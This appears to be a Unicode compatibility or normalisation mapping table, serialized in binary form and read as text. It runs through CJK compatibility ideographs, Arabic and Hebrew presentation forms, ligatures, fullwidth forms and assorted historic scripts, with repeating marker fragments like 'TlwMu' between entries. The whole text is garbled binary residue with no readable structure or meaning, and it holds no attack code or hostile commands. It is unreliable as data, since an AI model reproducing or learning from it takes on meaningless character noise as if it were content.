辰TlwMu沈TlwMu拾TlwMu若TlwMu掠TlwMu略TlwMu亮TlwMu兩TlwMu凉TlwMu梁TlwMu糧TlwMu良TlwMu諒TlwMu量TlwMu勵TlwMu呂TlwMu女TlwMu廬TlwMu旅TlwMu濾TlwMu礪TlwMu閭TlwMu驪TlwMu麗TlwMu黎TlwMu力TlwMu曆TlwMu歷TlwMu轢TlwMu年TlwMu憐TlwMu戀TlwMu撚TlwMu漣TlwMu煉TlwMu璉TlwMu秊TlwMu練TlwMu聯TlwMu輦TlwMu蓮TlwMu連TlwMu鍊TlwMu列TlwMu劣TlwMu咽TlwMu烈TlwMu裂TlwMu說TlwMu廉TlwMu念TlwMu捻TlwMu殮TlwMu簾TlwMu獵TlwMu令TlwMu囹TlwMu寧TlwMu嶺TlwMu怜TlwMu玲LdTlwMu瑩TlwMu羚TlwMu聆TlwMu鈴TlwMu零TlwMu靈TlwMu領TlwMu例TlwMu禮TlwMu醴TlwMu隸TlwMu惡TlwMu了TlwMu僚TlwMu寮TlwMu尿TlwMu料TlwMu樂TlwMu燎TlwMu療TlwMu蓼TlwMu遼TlwMu龍TlwMu暈TlwMu阮TlwMu劉TlwMu杻TlwMu柳TlwMu流TlwMu溜TlwMu琉TlwMu留TlwMu硫TlwMu紐TlwMu類TlwMu六TlwMu戮TlwMu陸TlwMu倫TlwMu崙TlwMu淪TlwMu輪TlwMu律TlwMu慄TlwMu栗TlwMu率TlwMu隆TlwMu利TlwMu吏TlwMu履TlwMu易TlwMu李TlwMu梨TlwMu泥TlwMu理TlwMu痢TlwMu罹TlwMu裏TlwMu裡TlwMu里TlwMu離TlwMu匿TlwMu溺TlwMu吝TlwMu燐TlwMu璘TlwMu藺TlwMu隣TlwMu鱗TlwMu麟TlwMu林TlwMu淋TlwMu臨TlwMu立TlwMu笠TlwMu粒TlwMu狀TlwMu炙TlwMu識TlwMu什TlwMu茶TlwMu刺TlwMu切TlwMu度TlwMu拓TlwMu糖TlwMu宅TlwMu洞TlwMu暴TlwMu輻TlwMu行TlwMu降TlwMu見TlwMu廓TlwMu兀TlwMu嗀TlwVTlwMu塚TlwVTlwMu晴LdTlwVTlwMu凞TlwMu猪TlwMu益TlwMu礼TlwMu神TlwMu祥TlwMu福TlwMu靖TlwMu精TlwMu羽TlwVTlwMu蘒TlwVTlwMu諸TlwVTlwMu逸TlwMu都TlwVTlwMu飯TlwMu飼TlwMu館TlwMu鶴TlwMu郞TlwMu隷TlwMu侮TlwMu僧TlwMu免TlwMu勉TlwMu勤TlwMu卑TlwMu喝TlwMu嘆TlwMu器TlwMu塀TlwMu墨TlwMu層TlwMu屮TlwMu悔TlwMu慨TlwMu憎TlwMu懲TlwMu敏TlwMu既TlwMu暑TlwMu梅TlwMu海TlwMu渚TlwMu漢TlwMu煮TlwMu爫TlwMu琢TlwMu碑TlwMu社TlwMu祉TlwMu祈TlwMu祐TlwMu祖TlwMu祝TlwMu禍TlwMu禎TlwMu穀TlwMu突TlwMu節TlwMu練TlwMu縉TlwMu繁TlwMu署TlwMu者TlwMu臭TlwMu艹TlwMu著TlwMu褐TlwMu視TlwMu謁TlwMu謹TlwMu賓TlwMu贈TlwMu辶TlwMu逸TlwMu難TlwMu響TlwMu頻TlwMu恵TlwMu𤋮TlwMu舘TlwXTlwMu並TlwMu况TlwMu全TlwMu侀TlwMu充TlwMu冀TlwMu勇TlwMu勺TlwMu喝TlwMu啕TlwMu喙TlwMu嗢TlwMu塚LdTlwMu墳TlwMu奄TlwMu奔TlwMu婢TlwMu嬨TlwMu廒TlwMu廙TlwMu彩TlwMu徭TlwMu惘TlwMu慎TlwMu愈TlwMu憎TlwMu慠TlwMu懲TlwMu戴TlwMu揄TlwMu搜TlwMu摒TlwMu敖TlwMu晴TlwMu朗TlwMu望TlwMu杖TlwMu歹TlwMu殺TlwMu流TlwMu滛TlwMu滋TlwMu漢TlwMu瀞TlwMu煮TlwMu瞧TlwMu爵TlwMu犯TlwMu猪TlwMu瑱TlwMu甆TlwMu画TlwMu瘝TlwMu瘟TlwMu益TlwMu盛TlwMu直TlwMu睊TlwMu着TlwMu磌TlwMu窱TlwMu節TlwMu类TlwMu絛TlwMu練TlwMu缾TlwMu者TlwMu荒TlwMu華TlwMu蝹TlwMu襁TlwMu覆TlwMu視TlwMu調TlwMu諸TlwMu請TlwMu謁TlwMu諾TlwMu諭TlwMu謹TlwMu變TlwMu贈TlwMu輸TlwMu遲TlwMu醙TlwMu鉶TlwMu陼TlwMu難TlwMu靖TlwMu韛TlwMu響TlwMu頋TlwMu頻TlwMu鬒TlwMu龜TlwMu𢡊TlwMu𢡄TlwMu𣏕TlwMu㮝TlwMu䀘TlwMu䀹TlwMu𥉉TlwMu𥳐TlwMu𧻓TlwMu齃TlwMu龎TlwXTlwMaffTlwMafiTlwMaflTlwMaffiTlwMafflTlwMastLdTlwXTlwMuմնTlwMuմեTlwMuմիTlwMuվնTlwMuմխTlwXTlwMuיִTlwVTlwMuײַTlwMuעTlwMuאTlwMuדTlwMuהTlwMuכTlwMuלTlwMuםTlwMuרTlwMuתTlw3w+TlwMuשׁTlwMuשׂTlwMuשּׁTlwMuשּׂTlwMuאַTlwMuאָTlwMuאּTlwMuבּTlwMuגּTlwMuדּTlwMuהּTlwMuוּTlwMuזּTlwXTlwMuטּTlwMuיּTlwMuךּTlwMuכּTlwMuלּTlwXTlwMuמּTlwXTlwMuנּTlwMuסּTlwXTlwMuףּTlwMuפּTlwXTlwMuצּTlwMuקּTlwMuרּTlwMuשּTlwMuתּTlwMuוֹTlwMuבֿTlwMuכֿTlwMuפֿTlwMuאלTlwMuٱTlwMuٻTlwMuپTlwMuڀTlwMuٺTlwMuٿTlwMuٹTlwMuڤTlwMuڦTlwMuڄTlwMuڃTlwMuچTlwMuڇTlwMuڍTlwMuڌTlwMuڎTlwMuڈTlwMuژTlwMuڑTlwMuکTlwMuگTlwMuڳTlwMuڱTlwMuںTlwMuڻTlwMuۀTlwMuہTlwMuھTlwMuےTlwMuۓTlwVTlwXTlwMuڭTlwMuۇTlwMuۆTlwMuۈTlwMuۇٴTlwMuۋTlwMuۅTlwMuۉTlwMuېTlwMuىLdTlwMuئاTlwMuئەTlwMuئوTlwMuئۇTlwMuئۆTlwMuئۈTlwMuئېTlwMuئىTlwMuیTlwMuئجTlwMuئحTlwMuئمTlwMuئىTlwMuئيTlwMuبجTlwMuبحTlwMuبخTlwMuبمTlwMuبىTlwMuبيTlwMuتجTlwMuتحTlwMuتخTlwMuتمTlwMuتىTlwMuتيTlwMuثجTlwMuثمTlwMuثىTlwMuثيTlwMuجحTlwMuجمTlwMuحجTlwMuحمTlwMuخجTlwMuخحTlwMuخمTlwMuسجTlwMuسحTlwMuسخTlwMuسمTlwMuصحTlwMuصمTlwMuضجTlwMuضحTlwMuضخTlwMuضمTlwMuطحTlwMuطمTlwMuظمTlwMuعجTlwMuعمTlwMuغجTlwMuغمTlwMuفجTlwMuفحTlwMuفخTlwMuفمTlwMuفىTlwMuفيTlwMuقحTlwMuقمTlwMuقىTlwMuقيTlwMuكاTlwMuكجTlwMuكحTlwMuكخTlwMuكلTlwMuكمTlwMuكىTlwMuكيTlwMuلجTlwMuلحTlwMuلخTlwMuلمTlwMuلىTlwMuليTlwMuمجTlwMuمحTlwMuمخTlwMuممTlwMuمىTlwMuميTlwMuنجTlwMuنحTlwMuنخTlwMuنمTlwMuنىTlwMuنيTlwMuهجTlwMuهمTlwMuهىTlwMuهيTlwMuيجTlwMuيحTlwMuيخTlwMuيمTlwMuيىTlwMuييLdTlwMuذٰTlwMuرٰTlwMuىٰTlw3u ٌّTlw3u ٍّTlw3u َّTlw3u ُّTlw3u ِّTlw3u ّٰTlwMuئرTlwMuئزTlwMuئمTlwMuئنTlwMuئىTlwMuئيTlwMuبرTlwMuبزTlwMuبمTlwMuبنTlwMuبىTlwMuبيTlwMuترTlwMuتزTlwMuتمTlwMuتنTlwMuتىTlwMuتيTlwMuثرTlwMuثزTlwMuثمTlwMuثنTlwMuثىTlwMuثيTlwMuفىTlwMuفيTlwMuقىTlwMuقيTlwMuكاTlwMuكلTlwMuكمTlwMuكىTlwMuكيTlwMuلمTlwMuلىTlwMuليTlwMuماTlwMuممTlwMuنرTlwMuنزTlwMuنمTlwMuننTlwMuنىTlwMuنيTlwMuىٰTlwMuيرTlwMuيزTlwMuيمTlwMuينTlwMuيىTlwMuييTlwMuئجTlwMuئحTlwMuئخTlwMuئمTlwMuئهTlwMuبجTlwMuبحTlwMuبخTlwMuبمTlwMuبهTlwMuتجTlwMuتحTlwMuتخTlwMuتمTlwMuتهTlwMuثمTlwMuجحTlwMuجمTlwMuحجTlwMuحمTlwMuخجTlwMuخمTlwMuسجTlwMuسحTlwMuسخTlwMuسمTlwMuصحTlwMuصخTlwMuصمTlwMuضجTlwMuضحTlwMuضخTlwMuضمTlwMuطحTlwMuظمTlwMuعجTlwMuعمTlwMuغجTlwMuغمTlwMuفجLdTlwMuفحTlwMuفخTlwMuفمTlwMuقحTlwMuقمTlwMuكجTlwMuكحTlwMuكخTlwMuكلTlwMuكمTlwMuلجTlwMuلحTlwMuلخTlwMuلمTlwMuلهTlwMuمجTlwMuمحTlwMuمخTlwMuممTlwMuنجTlwMuنحTlwMuنخTlwMuنمTlwMuنهTlwMuهجTlwMuهمTlwMuهٰTlwMuيجTlwMuيحTlwMuيخTlwMuيمTlwMuيهTlwMuئمTlwMuئهTlwMuبمTlwMuبهTlwMuتمTlwMuتهTlwMuثمTlwMuثهTlwMuسمTlwMuسهTlwMuشمTlwMuشهTlwMuكلTlwMuكمTlwMuلمTlwMuنمTlwMuنهTlwMuيمTlwMuيهTlwMuـَّTlwMuـُّTlwMuـِّTlwMuطىTlwMuطيTlwMuعىTlwMuعيTlwMuغىTlwMuغيTlwMuسىTlwMuسيTlwMuشىTlwMuشيTlwMuحىTlwMuحيTlwMuجىTlwMuجيTlwMuخىTlwMuخيTlwMuصىTlwMuصيTlwMuضىTlwMuضيTlwMuشجTlwMuشحTlwMuشخTlwMuشمTlwMuشرTlwMuسرTlwMuصرTlwMuضرTlwMuطىTlwMuطيTlwMuعىTlwMuعيTlwMuغىTlwMuغيTlwMuسىTlwMuسيTlwMuشىTlwMuشيTlwMuحىTlwMuحيTlwMuجىTlwMuجيTlwMuخىTlwMuخيTlwMuصىTlwMuصيLdTlwMuضىTlwMuضيTlwMuشجTlwMuشحTlwMuشخTlwMuشمTlwMuشرTlwMuسرTlwMuصرTlwMuضرTlwMuشجTlwMuشحTlwMuشخTlwMuشمTlwMuسهTlwMuشهTlwMuطمTlwMuسجTlwMuسحTlwMuسخTlwMuشجTlwMuشحTlwMuشخTlwMuطمTlwMuظمTlwMuاًTlwVTlwMuتجمTlwMuتحجTlwMuتحمTlwMuتخمTlwMuتمجTlwMuتمحTlwMuتمخTlwMuجمحTlwMuحميTlwMuحمىTlwMuسحجTlwMuسجحTlwMuسجىTlwMuسمحTlwMuسمجTlwMuسممTlwMuصححTlwMuصممTlwMuشحمTlwMuشجيTlwMuشمخTlwMuشممTlwMuضحىTlwMuضخمTlwMuطمحTlwMuطممTlwMuطميTlwMuعجمTlwMuعممTlwMuعمىTlwMuغممTlwMuغميTlwMuغمىTlwMuفخمTlwMuقمحTlwMuقممTlwMuلحمTlwMuلحيTlwMuلحىTlwMuلججTlwMuلخمTlwMuلمحTlwMuمحجTlwMuمحمTlwMuمحيTlwMuمجحTlwMuمجمTlwMuمخجTlwMuمخمTlwXTlwMuمجخTlwMuهمجTlwMuهممTlwMuنحمTlwMuنحىTlwMuنجمTlwMuنجىTlwMuنميTlwMuنمىTlwMuيممTlwMuبخيTlwMuتجيTlwMuتجىTlwMuتخيTlwMuتخىTlwMuتميTlwMuتمىTlwMuجميTlwMuجحىTlwMuجمىTlwMuسخىTlwMuصحيTlwMuشحيLdTlwMuضحيTlwMuلجيTlwMuلميTlwMuيحيTlwMuيجيTlwMuيميTlwMuمميTlwMuقميTlwMuنحيTlwMuقمحTlwMuلحمTlwMuعميTlwMuكميTlwMuنجحTlwMuمخيTlwMuلجمTlwMuكممTlwMuلجمTlwMuنجحTlwMuجحيTlwMuحجيTlwMuمجيTlwMuفميTlwMuبحيTlwMuكممTlwMuعجمTlwMuصممTlwMuسخيTlwMuنجيTlwXTlwVTlwXTlwMuصلےTlwMuقلےTlwMuاللهTlwMuاكبرTlwMuمحمدTlwMuصلعمTlwMuرسولTlwMuعليهTlwMuوسلمTlwMuصلىTlw3uصلى الله عليه وسلمTlw3uجل جلالهTlwMuریالTlwVTlwITlw3w,TlwMu、TlwXTlw3w:Tlw3w;Tlw3w!Tlw3w?TlwMu〖TlwMu〗TlwXTlwVTlwXTlwMu—TlwMu–Tlw3w_Tlw3w(Tlw3w)Tlw3w{Tlw3w}TlwMu〔TlwMu〕TlwMu【TlwMu】TlwMu《TlwMu》TlwMu〈TlwMu〉TlwMu「TlwMu」TlwMu『TlwMu』TlwVTlw3w[Tlw3w]Tlw3u ̅Tlw3w_Tlw3w,TlwMu、TlwXTlw3w;Tlw3w:Tlw3w?Tlw3w!TlwMu—Tlw3w(Tlw3w)Tlw3w{Tlw3w}TlwMu〔TlwMu〕Tlw3w#Tlw3w&Tlw3w*LdTlw3w+TlwMw-Tlw3w<Tlw3w>Tlw3w=TlwXTlw3w\Tlw3w$Tlw3w%Tlw3w@TlwXTlw3u ًTlwMuـًTlw3u ٌTlwVTlw3u ٍTlwXTlw3u َTlwMuـَTlw3u ُTlwMuـُTlw3u ِTlwMuـِTlw3u ّTlwMuـّTlw3u ْTlwMuـْTlwMuءTlwMuآTlwMuأTlwMuؤTlwMuإTlwMuئTlwMuاTlwMuبTlwMuةTlwMuتTlwMuثTlwMuجTlwMuحTlwMuخTlwMuدTlwMuذTlwMuرTlwMuزTlwMuسTlwMuشTlwMuصTlwMuضTlwMuطTlwMuظTlwMuعTlwMuغTlwMuفTlwMuقTlwMuكTlwMuلTlwMuمTlwMuنTlwMuهTlwMuوTlwMuىTlwMuيTlwMuلآTlwMuلأTlwMuلإTlwMuلاTlwXTlwITlwXTlw3w!Tlw3w"Tlw3w#Tlw3w$Tlw3w%Tlw3w&Tlw3w'Tlw3w(Tlw3w)Tlw3w*Tlw3w+Tlw3w,TlwMw-TlwMw.Tlw3w/TlwMw0TlwMw1TlwMw2TlwMw3TlwMw4TlwMw5TlwMw6TlwMw7TlwMw8TlwMw9Tlw3w:Tlw3w;Tlw3w<Tlw3w=Tlw3w>LdTlw3w?Tlw3w@TlwMwaTlwMwbTlwMwcTlwMwdTlwMweTlwMwfTlwMwgTlwMwhTlwMwiTlwMwjTlwMwkTlwMwlTlwMwmTlwMwnTlwMwoTlwMwpTlwMwqTlwMwrTlwMwsTlwMwtTlwMwuTlwMwvTlwMwwTlwMwxTlwMwyTlwMwzTlw3w[Tlw3w\Tlw3w]Tlw3w^Tlw3w_Tlw3w`TlwMwaTlwMwbTlwMwcTlwMwdTlwMweTlwMwfTlwMwgTlwMwhTlwMwiTlwMwjTlwMwkTlwMwlTlwMwmTlwMwnTlwMwoTlwMwpTlwMwqTlwMwrTlwMwsTlwMwtTlwMwuTlwMwvTlwMwwTlwMwxTlwMwyTlwMwzTlw3w{Tlw3w|Tlw3w}Tlw3w~TlwMu⦅TlwMu⦆TlwMw.TlwMu「TlwMu」TlwMu、TlwMu・TlwMuヲTlwMuァTlwMuィTlwMuゥTlwMuェTlwMuォTlwMuャTlwMuュTlwMuョTlwMuッTlwMuーTlwMuアTlwMuイTlwMuウTlwMuエTlwMuオTlwMuカTlwMuキTlwMuクTlwMuケTlwMuコTlwMuサTlwMuシTlwMuスTlwMuセTlwMuソTlwMuタTlwMuチTlwMuツLdTlwMuテTlwMuトTlwMuナTlwMuニTlwMuヌTlwMuネTlwMuノTlwMuハTlwMuヒTlwMuフTlwMuヘTlwMuホTlwMuマTlwMuミTlwMuムTlwMuメTlwMuモTlwMuヤTlwMuユTlwMuヨTlwMuラTlwMuリTlwMuルTlwMuレTlwMuロTlwMuワTlwMuンTlwMu゙TlwMu゚TlwXTlwMuᄀTlwMuᄁTlwMuᆪTlwMuᄂTlwMuᆬTlwMuᆭTlwMuᄃTlwMuᄄTlwMuᄅTlwMuᆰTlwMuᆱTlwMuᆲTlwMuᆳTlwMuᆴTlwMuᆵTlwMuᄚTlwMuᄆTlwMuᄇTlwMuᄈTlwMuᄡTlwMuᄉTlwMuᄊTlwMuᄋTlwMuᄌTlwMuᄍTlwMuᄎTlwMuᄏTlwMuᄐTlwMuᄑTlwMuᄒTlwXTlwMuᅡTlwMuᅢTlwMuᅣTlwMuᅤTlwMuᅥTlwMuᅦTlwXTlwMuᅧTlwMuᅨTlwMuᅩTlwMuᅪTlwMuᅫTlwMuᅬTlwXTlwMuᅭTlwMuᅮTlwMuᅯTlwMuᅰTlwMuᅱTlwMuᅲTlwXTlwMuᅳTlwMuᅴTlwMuᅵTlwXTlwMu¢TlwMu£TlwMu¬Tlw3u ̄TlwMu¦TlwMu¥TlwMu₩TlwXTlwMu│TlwMu←TlwMu↑TlwMu→TlwMu↓TlwMu■LdTlwMu○TlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTl΀wXTlЀwVTlހwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlЃwVTlwXTlwVTlwXTlwVTlхwXTlwVTlwXTlwVTlwXTlwVTlˆwXTlІwVTlwXTlwVTlwXTlwVTlćwXTlȇwVTlևwXTlwMu𐐨TlwMu𐐩TlwMu𐐪TlwMu𐐫TlwMu𐐬TlwMu𐐭TlwMu𐐮TlwMu𐐯TlwMu𐐰TlwMu𐐱TlwMu𐐲TlwMu𐐳TlwMu𐐴TlwMu𐐵TlwMu𐐶TlwMu𐐷TlwMu𐐸TlwMu𐐹TlwMu𐐺TlwMu𐐻TlwMu𐐼TlwMu𐐽TlwMu𐐾TlwMu𐐿TlwMu𐑀TlwMu𐑁TlwMu𐑂TlwMu𐑃TlwMu𐑄TlwMu𐑅TlwMu𐑆TlwMu𐑇TlwMu𐑈TlwMu𐑉TlwMu𐑊TlwMu𐑋TlwMu𐑌TlwMu𐑍TlwMu𐑎TlwMu𐑏TlwVTlwXTlwVTlwXTlwMu𐓘TlwMu𐓙TlwMu𐓚TlwMu𐓛TlwMu𐓜TlwMu𐓝TlwMu𐓞TlwMu𐓟TlwMu𐓠TlwMu𐓡LdTlwMu𐓢TlwMu𐓣TlwMu𐓤TlwMu𐓥TlwMu𐓦TlwMu𐓧TlwMu𐓨TlwMu𐓩TlwMu𐓪TlÉwMu𐓫TlĉwMu𐓬TlŉwMu𐓭TlƉwMu𐓮TlǉwMu𐓯TlȉwMu𐓰TlɉwMu𐓱TlʉwMu𐓲TlˉwMu𐓳Tl̉wMu𐓴Tl͉wMu𐓵TlΉwMu𐓶TlωwMu𐓷TlЉwMu𐓸TlщwMu𐓹Tl҉wMu𐓺TlӉwMu𐓻TlԉwXTl؉wVTlwXTlwVTlwXTlwVTlwXTlwVTlwMu𐖗TlwMu𐖘TlwMu𐖙TlwMu𐖚TlwMu𐖛TlwMu𐖜TlwMu𐖝TlwMu𐖞TlwMu𐖟TlwMu𐖠TlwMu𐖡TlwXTlwMu𐖣TlwMu𐖤TlwMu𐖥TlwMu𐖦TlwMu𐖧TlwMu𐖨TlwMu𐖩TlwMu𐖪TlwMu𐖫TlwMu𐖬TlwMu𐖭TlwMu𐖮TlwMu𐖯TlwMu𐖰TlwMu𐖱TlwXTlwMu𐖳TlwMu𐖴TlwMu𐖵TlwMu𐖶TlwMu𐖷TlwMu𐖸TlwMu𐖹TlwXTlwMu𐖻TlwMu𐖼TlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTl֎wXTlwVTlwXTlwVTlwMuːTlwMuˑTlwMuæTlwMuʙTlwMuɓTlwXTlwMuʣTlwMuꭦTlwMuʥTlwMuʤTlwMuɖTlwMuɗLdTlwMuᶑTlwMuɘTlwMuɞTlwMuʩTlwMuɤTlwMuɢTlwMuɠTlwMuʛTlwMuħTlwMuʜTlwMuɧTlwMuʄTlwMuʪTlwMuʫTlwMuɬTlwMu𝼄TlwMuꞎTlwMuɮTlwMu𝼅TlwMuʎTlwMu𝼆TlwMuøTlwMuɶTlwMuɷTlwMwqTlwMuɺTlwMu𝼈TlwMuɽTlwMuɾTlwMuʀTlwMuʨTlwMuʦTlwMuꭧTlwMuʧTlwMuʈTlwMuⱱTlwXTlwMuʏTlwMuʡTlwMuʢTlwMuʘTlwMuǀTlwMuǁTlwMuǂTlwMu𝼊TlwMu𝼞TlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTl֐wXTlאwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlГwXTlғwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlɔwXTlДwVTlٔwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVLdTlwXTlwVTl֖wXTlؖwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlɘwXTlwMu𐳀TlwMu𐳁TlwMu𐳂TlwMu𐳃TlwMu𐳄TlwMu𐳅TlwMu𐳆TlwMu𐳇TlwMu𐳈TlwMu𐳉TlwMu𐳊TlwMu𐳋TlwMu𐳌TlwMu𐳍TlwMu𐳎TlwMu𐳏TlwMu𐳐TlwMu𐳑TlwMu𐳒TlwMu𐳓TlwMu𐳔TlwMu𐳕TlwMu𐳖TlwMu𐳗TlwMu𐳘TlwMu𐳙TlwMu𐳚TlwMu𐳛TlwMu𐳜TlwMu𐳝TlwMu𐳞TlwMu𐳟TlwMu𐳠TlwMu𐳡TlwMu𐳢TlwMu𐳣TlwMu𐳤TlwMu𐳥TlwMu𐳦TlwMu𐳧TlwMu𐳨TlwMu𐳩TlwMu𐳪TlwMu𐳫TlwMu𐳬TlwMu𐳭TlwMu𐳮TlwMu𐳯TlwMu𐳰TlwMu𐳱TlwMu𐳲TlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlڞwXTlwVTlwXTlwVTl̟wXTlwVTlwXTlwVTlΠwXTlҠwVTlwXTlwVTlwXTlwVTláwXTlСwVTlwXTlwVLdTlwXTlwVTlwXTlwVTlȢwXTlТwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTl¤wXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlŦwXTlǦwVTlɦwXTl˦wVTlΦwXTlЦwVTlѦwXTlצwVTlئwXTlݦwVTlwXTlwVTlwXTlwVTlwXTlwVTlܨwXTlݨwVTlwXTlwVTlȩwXTlЩwVTlکwXTlwVTlwXTlwVTlޫwXTlwVTlŬwXTlЬwVTlڬwXTlwVTlwXTlwVTlwXTlwVTlʭwXTlwVTlwXTlwVTlwXTlwVTlǮwXTlwVTlwXTlwMu𑣀TlwMu𑣁TlwMu𑣂TlwMu𑣃TlwMu𑣄TlwMu𑣅TlwMu𑣆TlwMu𑣇TlwMu𑣈TlwMu𑣉TlwMu𑣊LdTlwMu𑣋TlwMu𑣌TlwMu𑣍TlwMu𑣎TlwMu𑣏TlwMu𑣐TlwMu𑣑TlwMu𑣒TlwMu𑣓TlwMu𑣔TlwMu𑣕TlwMu𑣖TlwMu𑣗TlwMu𑣘TlwMu𑣙TlwMu𑣚TlwMu𑣛TlwMu𑣜TlwMu𑣝TlwMu𑣞TlwMu𑣟TlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlǲwXTlвwVTlڲwXTlwVTlwXTlwVTlسwXTlڳwVTlwXTlwVTlȴwXTlдwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlƸwXTlиwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlȺwXTlкwVTlںwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVLdTlھwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlǌwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwMu𖹠TlwMu𖹡TlwMu𖹢TlwMu𖹣TlwMu𖹤TlwMu𖹥TlwMu𖹦TlwMu𖹧TlwMu𖹨TlwMu𖹩TlwMu𖹪TlwMu𖹫TlwMu𖹬TlwMu𖹭TlwMu𖹮TlwMu𖹯TlwMu𖹰TlwMu𖹱TlwMu𖹲TlwMu𖹳TlwMu𖹴TlwMu𖹵TlwMu𖹶TlwMu𖹷TlwMu𖹸TlwMu𖹹TlwMu𖹺TlwMu𖹻TlwMu𖹼TlwMu𖹽TlwMu𖹾TlwMu𖹿TlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTl֙wXTlwVTlwXTlwVTlwXTlwVTlwXTlwVLdTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwITlwXTlwVTlwXTlwVTlǞwXTlОwVTlğwXTlwVTlwXTlwVTlwXTlwVTlޢwMu𝅗𝅥TlߢwMu𝅘𝅥TlwMu𝅘𝅥𝅮TlwMu𝅘𝅥𝅯TlwMu𝅘𝅥𝅰TlwMu𝅘𝅥𝅱TlwMu𝅘𝅥𝅲TlwVTlwXTlwVTlwMu𝆹𝅥TlwMu𝆺𝅥TlwMu𝆹𝅥𝅮TlwMu𝆺𝅥𝅮TlwMu𝆹𝅥𝅯TlwMu𝆺𝅥𝅯TlwVTlwXTlwVTlƤwXTlwVTlԥwXTlwVTlwXTlwVTlצwXTlwVTlwXTlwMwaTlwMwbTlwMwcTlwMwdTlwMweTlwMwfTlwMwgTlwMwhTlwMwiTlwMwjTlwMwkTlwMwlTlwMwmTlwMwnTlwMwoTlwMwpTlwMwqTlwMwrTlwMwsTlwMwtTlwMwuTlwMwvTlwMwwTlwMwxTlwMwyTlwMwzTlwMwaTlwMwbTlwMwcTlwMwdTlwMweTlwMwfTlwMwgTlwMwhTlwMwiTlwMwjTlwMwkLdTlwMwlTlwMwmTlwMwnTlwMwoTlwMwpTlwMwqTlwMwrTlwMwsTlwMwtTlwMwuTlwMwvTlwMwwTlwMwxTlwMwyTlwMwzTlwMwaTlwMwbTlwMwcTlwMwdTlwMweTlwMwfTlwMwgTlwMwhTlwMwiTlwMwjTlwMwkTlwMwlTlwMwmTlwMwnTl¨wMwoTlèwMwpTlĨwMwqTlŨwMwrTlƨwMwsTlǨwMwtTlȨwMwuTlɨwMwvTlʨwMwwTl˨wMwxTl̨wMwyTlͨwMwzTlΨwMwaTlϨwMwbTlШwMwcTlѨwMwdTlҨwMweTlӨwMwfTlԨwMwgTlըwXTl֨wMwiTlרwMwjTlبwMwkTl٨wMwlTlڨwMwmTlۨwMwnTlܨwMwoTlݨwMwpTlިwMwqTlߨwMwrTlwMwsTlwMwtTlwMwuTlwMwvTlwMwwTlwMwxTlwMwyTlwMwzTlwMwaTlwMwbTlwMwcTlwMwdTlwMweTlwMwfTlwMwgTlwMwhTlwMwiTlwMwjTlwMwkTlwMwlTlwMwmTlwMwnTlwMwoTlwMwpTlwMwqTlwMwrTlwMwsTlwMwtTlwMwuTlwMwvTlwMwwTlwMwxTlwMwyTlwMwzTlwMwaTlwMwbTlwMwcTlwMwdTlwMweTlwMwfTlwMwgLdTlwMwhTlwMwiTlwMwjTlwMwkTlwMwlTlwMwmTlwMwnTlwMwoTlwMwpTlwMwqTlwMwrTlwMwsTlwMwtTlwMwuTlwMwvTlwMwwTlwMwxTlwMwyTlwMwzTlwMwaTlwXTlwMwcTlwMwdTlwXTlwMwgTlwXTlwMwjTlwMwkTlwXTlwMwnTlwMwoTlwMwpTlwMwqTlwXTlwMwsTlwMwtTlwMwuTlwMwvTlwMwwTlwMwxTlwMwyTlwMwzTlwMwaTlwMwbTlwMwcTlwMwdTlwXTlwMwfTlwXTlwMwhTlwMwiTlwMwjTlwMwkTlwMwlTl©wMwmTléwMwnTlĩwXTlũwMwpTlƩwMwqTlǩwMwrTlȩwMwsTlɩwMwtTlʩwMwuTl˩wMwvTl̩wMwwTlͩwMwxTlΩwMwyTlϩwMwzTlЩwMwaTlѩwMwbTlҩwMwcTlөwMwdTlԩwMweTlթwMwfTl֩wMwgTlשwMwhTlةwMwiTl٩wMwjTlکwMwkTl۩wMwlTlܩwMwmTlݩwMwnTlީwMwoTlߩwMwpTlwMwqTlwMwrTlwMwsTlwMwtTlwMwuTlwMwvTlwMwwTlwMwxTlwMwyTlwMwzTlwMwaTlwMwbTlwMwcTlwMwdTlwMweTlwMwfLdTlwMwgTlwMwhTlwMwiTlwMwjTlwMwkTlwMwlTlwMwmTlwMwnTlwMwoTlwMwpTlwMwqTlwMwrTlwMwsTlwMwtTlwMwuTlwMwvTlwMwwTlwMwxTlwMwyTlwMwzTlwMwaTlwMwbTlwXTlwMwdTlwMweTlwMwfTlwMwgTlwXTlwMwjTlwM